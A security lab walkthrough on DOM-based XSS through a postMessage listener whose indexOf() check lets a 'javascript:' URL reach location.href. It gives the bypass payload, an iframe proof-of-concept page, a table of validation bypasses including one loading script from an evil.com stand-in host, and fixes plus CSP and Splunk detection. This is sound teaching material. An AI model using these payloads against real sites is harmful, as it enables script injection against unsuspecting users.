# Lab Walkthrough: DOM XSS using Web Messages and a JavaScript URL

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS) / Logic Flaw
* **Target Context:** Client-Side JavaScript (`postMessage` to `location.href` Sink)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Flawed Validation & Bypass Comparison](https://www.google.com/search?q=%25234-flawed-validation--bypass-comparison&utm_source=gemini)
5. [Automated Exploitation Script (HTML PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-html-poc&utm_source=gemini)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%25236-defense-hardening--secure-coding&utm_source=gemini)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%25237-siem-detection--telemetry-analysis&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability merges HTML5 Web Messaging (`postMessage`) with flawed string-matching logic and an unsafe navigation sink (`location.href`).

* **The Core Flaw:** The developer attempted to validate the incoming web message by checking if it contains the substring `http:` or `https:`. However, they used `indexOf()`, which merely verifies if the string exists *anywhere* in the payload, not just at the beginning (as a valid URL protocol should).
* **Real-World Analogy:** Imagine a nightclub bouncer instructed to only admit guests whose ID cards say "State of New York". A teenager writes "Fake ID // State of New York" on a napkin. The bouncer spots the required phrase, ignores the context, and lets them in.
* **The Sink (`location.href`):** When untrusted input is passed to `location.href`, the browser navigates to the provided string. If the string starts with the `javascript:` pseudo-protocol, the browser executes it as code instead of routing to a web page.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   WEB MESSAGE NAVIGATION XSS FLOW                      │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Exploit Page] iframe.contentWindow.postMessage('javascript:print()//http:', '*')
           │
           ▼
  [2. Target Listener] Receives message: "javascript:print()//http:"
           │
           ▼
  [3. Flawed Validation] if (e.data.indexOf('http:') > -1) 
      -> Condition evaluates to TRUE (substring found at the end).
           │
           ▼
  [4. Sink Execution] location.href = "javascript:print()//http:";
           │
           ▼
  [5. Browser Engine] Sees "javascript:" protocol.
      Executes print().
      Ignores "//http:" because "//" marks a JavaScript comment.

```

> **Learning Checkpoint 1:** Why is `location.href` a dangerous sink? While typically used for redirection, passing the `javascript:` or `data:` schema into `location.href` immediately pivots the browser from navigating the web into a direct JavaScript execution context.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The global `message` event listener on the application's home page.
* **Primary Objective:** Exploit the flawed `indexOf()` validation to pass a `javascript:` payload into the `location.href` sink.
* **Validation Signal:** The lab is solved when the exploit successfully calls the `print()` function within the victim's browser.

---

## 3. Step-by-Step Exploitation Flow

Adopt a structured approach to mapping client-side validation logic and identifying bypasses.

* **Phase 1: Reconnaissance & Source Mapping**
* Load the target home page. Open browser Developer Tools (F12) -> **Sources** tab.
* Search the JavaScript files for `addEventListener('message'` or `onmessage`.
* *Observation:* You find an event listener that takes the incoming web message (`e.data`), checks it, and assigns it to `location.href`.


* **Phase 2: Code Review & Flaw Identification**
* **Analyze the Validation:**
```javascript
if (e.data.indexOf('http:') > -1 || e.data.indexOf('https:') > -1) {
    location.href = e.data;
}

```


* **Identify the Weakness:** `indexOf() > -1` only confirms the string exists. It does not anchor the match to the beginning of the string (like `startsWith()` would).


* **Phase 3: Payload Construction & Execution**
* The payload must start with `javascript:` to achieve code execution.
* The payload must contain `http:` to pass the `indexOf()` check.
* The payload must be valid JavaScript syntax so the browser engine doesn't throw an error when executing.
* **Constructed Payload:** `javascript:print()//http:`
* `javascript:` triggers the execution context.
* `print()` is the arbitrary command.
* `//` turns the remainder of the payload into a JavaScript comment.
* `http:` satisfies the flawed validation without breaking the JavaScript syntax.


* Navigate to the **Exploit Server**, frame the target application, and blast the payload via `postMessage`.



> **Learning Checkpoint 2:** What would happen if we used `javascript:print()http:` without the `//`? The browser would attempt to execute `print()http:`, which is a syntax error (`Unexpected identifier`). The JavaScript engine would crash, and the exploit would fail.

---

## 4. Flawed Validation & Bypass Comparison

Understanding string validation weaknesses is critical for finding bypasses during source code reviews.

| Developer Logic | Flaw | Attacker Bypass Strategy |
| --- | --- | --- |
| `data.indexOf('http') > -1` | Substring match anywhere | Append expected string as a comment: `javascript:alert(1)//http` |
| `data.startsWith('http://')` | Assumes standard protocol | Use protocol-relative URLs if DOM allows: `//[evil.com/xss.js](https://evil.com/xss.js)` |
| `data.match(/^https?:\/\//)` | Loose Regex (No end anchor) | Append arbitrary paths: `[https://trusted.com.evil.com](https://trusted.com.evil.com)` |
| `data === '[https://trusted.com](https://trusted.com)'` | Strict Equality | **Secure.** (Very difficult to bypass unless prototype pollution exists) |

---

## 5. Automated Exploitation Script (HTML PoC)

This HTML payload is hosted on the attacker's server. It forces the victim to load the vulnerable application and subsequently injects the payload, bypassing the `indexOf` check.

```html
<!DOCTYPE html>
<html>
<head>
    <title>postMessage Validation Bypass PoC</title>
</head>
<body>
    <!-- 1. Frame the vulnerable target application -->
    <!-- 2. Use 'onload' to ensure the target's event listener is ready -->
    <iframe 
        src="https://YOUR-LAB-ID.web-security-academy.net/" 
        onload="this.contentWindow.postMessage('javascript:print()//http:', '*')"
        style="width: 800px; height: 600px; border: none;">
    </iframe>
</body>
</html>

```

*Note: Replace `YOUR-LAB-ID` with your active lab instance URL.*

---

## 6. Defense, Hardening & Secure Coding

To secure Web Messaging and navigation sinks, developers must use strict, anchored validation methods.

* **Anchor String Validation (Primary Defense):** Never use `indexOf()` or `includes()` to validate URL protocols. Use `startsWith()`, or better yet, parse the input using the `URL` object.
```javascript
// INSECURE:
if (url.indexOf('https:') > -1) { ... }

// SECURE (Using the URL API):
try {
    let parsedUrl = new URL(e.data);
    if (parsedUrl.protocol === 'https:' && parsedUrl.hostname === 'trusted-domain.com') {
        location.href = parsedUrl.href;
    }
} catch (error) {
    // Invalid URL format
}

```


* **Origin Validation:** Always verify the sender's origin `e.origin` before processing *any* message data.
* **Avoid Unsafe Sinks:** If the application only needs to redirect the user to a set of pre-approved paths, map incoming identifiers to a backend dictionary of safe URLs rather than executing raw input via `location.href`.

---

## 7. SIEM Detection & Telemetry Analysis

Because DOM-to-DOM messaging occurs entirely client-side, traditional WAFs cannot see the `postMessage` payload. Telemetry relies on browser-enforced policies.

### Client-Side Telemetry (CSP)

Detecting this attack requires a strict Content Security Policy (CSP) blocking inline scripts and tracking violations.

* **CSP Configuration:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-violation-endpoint

```


* **Splunk Search Query (Parsing CSP JSON Reports):**
```spl
index=web_application sourcetype=csp_report 
| spath "csp-report.blocked-uri" 
| search "csp-report.blocked-uri"="inline" OR "csp-report.blocked-uri"="javascript:*"
| stats count by src_ip, "csp-report.document-uri"

```



---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Iframe loads, but payload doesn't fire** | Race Condition. | Ensure `postMessage` is triggered *after* the iframe loads using the `onload` attribute. |
| **Console Error: `Unexpected identifier**` | Syntax error in payload. | You forgot to comment out the validation string. Ensure you use `//http:` or `/*http:*/` so the JS engine ignores it. |
| **Target application redirects to `http:` instead of executing** | Payload overwritten or missing `javascript:` | Ensure the payload exactly matches `javascript:print()//http:` with no spaces before `javascript:`. |

---

## 9. References & Standards

* [Mozilla Developer Network (MDN): URL API](https://www.google.com/search?q=https://developer.mozilla.org/en-US/docs/Web/API/URL&utm_source=gemini)
* [PortSwigger: DOM-Based Web Message Vulnerabilities](https://www.google.com/search?q=https://portswigger.net/web-security/dom-based/web-messages&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/&utm_source=gemini)

---

> **Key Insight:** `indexOf()` is a search function, not a validation boundary. When securing client-side navigation sinks like `location.href`, relying on loose substring matching allows attackers to craft multi-context payloads (e.g., executing code via `javascript:` while simultaneously satisfying the string requirement via a `//comment`).
